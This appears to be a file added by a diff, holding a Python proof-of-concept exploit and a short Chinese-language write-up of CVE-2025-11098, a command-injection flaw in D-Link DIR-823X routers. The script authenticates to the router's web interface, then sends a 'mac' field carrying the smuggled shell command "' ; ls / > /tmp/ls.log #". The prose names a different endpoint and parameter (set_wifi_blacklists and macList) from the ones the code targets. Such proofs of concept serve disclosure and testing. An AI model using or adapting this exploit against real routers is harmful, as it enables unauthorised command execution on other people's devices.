@@ -1,0 +1,135 @@
+
+```python
+import requests
+import logging
+import argparse
+import re
+import hmac
+import hashlib
+logging.basicConfig(level=logging.DEBUG)
+def extract\_cookies\_from\_response(response):
+cookies = response.headers.get('Set-Cookie', '')
+sessionid = re.search(r'sessionid=([^;]+)', cookies)
+token = re.search(r'token=([^;]+)', cookies)
+sessionid = sessionid.group(1) if sessionid else None
+token = token.group(1) if token else None
+return sessionid, token
+def send\_get\_login\_page(session, host\_ip):
+url = f"http://{host\_ip}/login.html"
+headers = {
+"Host": host\_ip,
+"User-Agent": "Mozilla/5.0 (X11; Linux x86\_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8",
+"Accept-Language": "en-US,en;q=0.5",
+"Accept-Encoding": "gzip, deflate",
+"Connection": "close",
+"Upgrade-Insecure-Requests": "1"
+}
+response = session.get(url, headers=headers)
+if response.status\_code == 200:
+sessionid, token = extract\_cookies\_from\_response(response)
+return sessionid, token
+else:
+logging.error("Failed to get login page.")
+logging.error(f"Status code: {response.status\_code}")
+logging.error(f"Response: {response.text}")
+return None, None
+def hash\_password(password, token):
+hashed = hmac.new(token.encode(), password.encode(), hashlib.sha256).hexdigest()
+return hashed
+def send\_login\_request(session, host\_ip, username, hashed\_password, sessionid, token):
+url = f"http://{host\_ip}/goform/login"
+headers = {
+"Host": host\_ip,
+"User-Agent": "Mozilla/5.0 (X11; Linux x86\_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+"Accept": "\*/\*",
+"Accept-Language": "en-US,en;q=0.5",
+"Accept-Encoding": "gzip, deflate",
+"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+"X-Requested-With": "XMLHttpRequest",
+"Origin": f"http://{host\_ip}",
+"Connection": "close",
+# "Referer": f"http://{host\_ip}/login.html",
+"Cookie": f"sessionid={sessionid}; token={token}"
+}
+payload = {
+"username": username,
+"password": hashed\_password,
+"token": token
+}
+response = session.post(url, headers=headers, data=payload)
+return response
+def send\_inject\_request(session, host\_ip, sessionid, token):
+url = f"http://{host\_ip}/goform/set\_device\_name"
+headers = {
+"Host": host\_ip,
+"User-Agent": "Mozilla/5.0 (X11; Linux x86\_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+"Accept": "\*/\*",
+"Accept-Language": "en-US,en;q=0.5",
+"Accept-Encoding": "gzip, deflate",
+"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+"X-Requested-With": "XMLHttpRequest",
+"Origin": f"http://{host\_ip}",
+"Connection": "close",
+# "Referer": f"http://{host\_ip}/login.html",
+"Cookie": f"sessionid={sessionid}; token={token}"
+}
+payload = {
+"mac": "\' ; ls / > /tmp/ls.log #",
+"token": token
+}
+response = session.post(url, headers=headers, data=payload)
+return response
+def main():
+session = requests.session()
+parser = argparse.ArgumentParser(description='HTTP POST Request Example.')
+parser.add\_argument('-H', '--host', metavar='host', default='192.168.1.1', help='Host IP address.')
+parser.add\_argument('-u', '--username', metavar='Username', required=True, help='Login username.')
+parser.add\_argument('-p', '--password', metavar='Password', required=True, help='Login password.')
+args = parser.parse\_args()
+logging.info(f'Host IP: {args.host}')
+# Get login page
+sessionid, token = send\_get\_login\_page(session, args.host)
+if sessionid and token:
+logging.info(f"GET login page request sent successfully. sessionid={sessionid}, token={token}")
+# Hash the password
+hashed\_password = hash\_password(args.password, token)
+# Send login request
+response = send\_login\_request(session, args.host, args.username, hashed\_password, sessionid, token)
+if response.status\_code == 200:
+logging.info("Login request sent successfully.")
+logging.debug(f"Response: {response.text}")
+# Extract updated sessionid and token from login response
+sessionid, token = extract\_cookies\_from\_response(response)
+# Send LAN settings request
+response = send\_inject\_request(session, args.host, sessionid, token)
+if response.status\_code == 200:
+logging.info("LAN settings request sent successfully.")
+logging.debug(f"Response: {response.text}")
+else:
+logging.error("Failed to send LAN settings request.")
+logging.error(f"Status code: {response.status\_code}")
+logging.error(f"Response: {response.text}")
+else:
+logging.error("Failed to send login request.")
+logging.error(f"Status code: {response.status\_code}")
+logging.error(f"Response: {response.text}")
+else:
+logging.error("Failed to retrieve sessionid and token from login page.")
+if \_\_name\_\_ == "\_\_main\_\_":
+main()
+```
+
+# CVE-2025-11098
+
+## 漏洞描述
+
+D-Link `DIR-823X`存在命令注入漏洞，该漏洞源于文件`/goform/set_wifi_blacklists`中参数`macList`的错误操作，攻击者可利用该漏洞导致远程命令注入。
+
+![CVE-2025-11098](upload/attach/202511/920134_RQ38ZQEG6TNSKQX.webp)
+
+![CVE-2025-11098](upload/attach/202511/920134_27JBRS24QS6FBBG.webp)
+
+![CVE-2025-11098](upload/attach/202511/920134_KDNAVDJQPPR8XR2.webp)
+
+## POC
